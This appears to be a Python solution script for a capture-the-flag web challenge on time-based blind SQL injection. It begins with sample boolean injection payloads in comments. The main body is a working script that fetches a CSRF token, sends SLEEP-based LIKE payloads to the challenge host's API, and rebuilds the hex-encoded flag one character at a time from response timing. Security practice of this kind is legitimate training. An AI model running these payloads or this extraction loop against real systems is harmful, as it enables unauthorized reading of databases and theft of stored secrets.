## Queries:

## Check if query works

# 1' AND (SELECT 1 WHERE 1=1)='1

## Check character in first position of SECRET

# 1' AND (SELECT 1 WHERE HEX('SECRET') LIKE '5%')='1

## Check inside the correct column

# 1' AND (SELECT 1 FROM secret WHERE HEX(asecret) LIKE 'guess%')='

"""
Problem: Web 20 - SQLi 4: Time-Based SQL Injection

Category: Web Security

Description: Get the flag by checking the time elapsing when the char matches

Algorith:
- Check every character to find the correct one using the 'LIKE' operator
- Use SLEEP(x) to make the db wait to send a response when it doesn't generate an error
- Check when the sleep as been activate using the time lib
- If more than x time has elapsed, save the char
- Print the flag

"""

import requests
from time import time

class Inj:
    def __init__(self, host):

        self.sess = requests.Session() # Start the session. We want to save the cookies
        self.base_url = '{}/api/'.format(host)
        self._refresh_csrf_token() # Refresh the ANTI-CSRF token

    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + 'get_token')
        resp = resp.json()
        self.token = resp['token']

    def _do_raw_req(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query }
        return self.sess.post(url,json=data, headers=headers).json()

    def logic(self, query):
        url = self.base_url + 'logic'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def union(self, query):
        url = self.base_url + 'union'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def blind(self, query):
        url = self.base_url + 'blind'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def time(self, query):
        url = self.base_url + 'time'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

inj = Inj('http://web-17.challs.olicyber.it')

dictionary = '0123456789abcdef'
result = ''

while True:
    for c in dictionary:
        question = f"1' AND (SELECT SLEEP(2) FROM flags WHERE HEX(flag) LIKE '{result+c}%')='1"
        start = time()
        response, error = inj.time(question)
        elapsed = time() - start
        if elapsed > 1: # We have a match!
            result += c
            break
    else:
        # when characters are finished
        break
    print(result)

# Cyber Chef --> From Hex